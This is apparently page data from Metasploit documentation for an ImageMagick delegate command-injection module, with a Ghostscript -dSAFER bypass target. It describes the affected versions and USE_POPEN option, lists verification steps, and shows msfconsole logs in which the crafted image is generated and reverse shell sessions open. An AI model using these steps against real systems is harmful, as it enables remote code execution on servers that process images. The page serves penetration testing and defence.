{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/fileformat/imagemagick_delegate","result":{"data":{"moduleMetadataJson":{"id":"7b6abf6b-4070-5c36-b25d-1ec521a16993","name":"ImageMagick Delegate Arbitrary Command Execution","fullname":"exploit/unix/fileformat/imagemagick_delegate","description":"This module exploits a shell command injection in the way \"delegates\"\n        (commands for converting files) are processed in ImageMagick versions\n        <= 7.0.1-0 and <= 6.9.3-9 (legacy).\n\n        Since ImageMagick uses file magic to detect file format, you can create\n        a .png (for example) which is actually a crafted SVG (for example) that\n        triggers the command injection.\n\n        The PostScript (PS) target leverages a Ghostscript -dSAFER bypass\n        (discovered by taviso) to achieve RCE in the Ghostscript delegate.\n        Ghostscript versions 9.18 and later are affected. This target is\n        provided as is and will not be updated to track additional vulns.\n\n        If USE_POPEN is set to true, a |-prefixed command will be used for the\n        exploit. No delegates are involved in this exploitation.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/fileformat/imagemagick_delegate","documentationSlug":"/modules/documentation/exploit/unix/fileformat/imagemagick_delegate","referencesSlug":"/modules/references/exploit/unix/fileformat/imagemagick_delegate"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  ImageMagick</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>  Example steps in this format:</p>\n<ol>\n<li>Install the ImageMagick</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploits/unix/fileformat/imagemagick_delegate</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>convert msf.png msf.jpg</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>USE_POPEN</strong></p>\n<p>  When the default option <code class=\"language-text\">true</code> is used, targets 0 (SVG file) and 1 (MVG file) are valid\nWhen the option is set to <code class=\"language-text\">false</code>, target 2 (PS file) is valid</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h2 id=\"popentrue\" style=\"position:relative;\"><a href=\"#popentrue\" aria-label=\"popentrue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>popen=true</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(imagemagick_delegate) &gt; set target 0\nmsf exploit(imagemagick_delegate) &gt; run\n\n[*] Started reverse TCP handler on 1.1.1.1:4444\n[+] msf.png stored at /Users/dmohanty/.msf4/local/msf.png\n[*] Command shell session 1 opened (1.1.1.11:4444 -&gt; 1.1.1.1:57212) at 2016-10-28 12:47:06 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(imagemagick_delegate) &gt; set target 1\nmsf exploit(imagemagick_delegate) &gt; run\n\n[*] Started reverse TCP handler on 10.6.0.186:4444\n[+] msf.png stored at /Users/dmohanty/.msf4/local/msf.png\n[*] Command shell session 2 opened (1.1.1.1:4444 -&gt; 1.1.1.1:64308) at 2016-10-28 15:48:40 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"popenfalse\" style=\"position:relative;\"><a href=\"#popenfalse\" aria-label=\"popenfalse permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>popen=false</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(imagemagick_delegate) &gt; set target 2\ntarget =&gt; 2\nmsf exploit(imagemagick_delegate) &gt; set USE_POPEN false\nUSE_POPEN =&gt; false\nmsf exploit(imagemagick_delegate) &gt; run\n\n[*] Started reverse TCP handler on 1.1.1.1:4444\n[+] msf.png stored at /Users/dmohanty/.msf4/local/msf.png\n[*] Command shell session 5 opened (1.1.1.1:4444 -&gt; 1.1.1.1:64772) at 2016-10-28 15:58:03 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"7b6abf6b-4070-5c36-b25d-1ec521a16993"}}}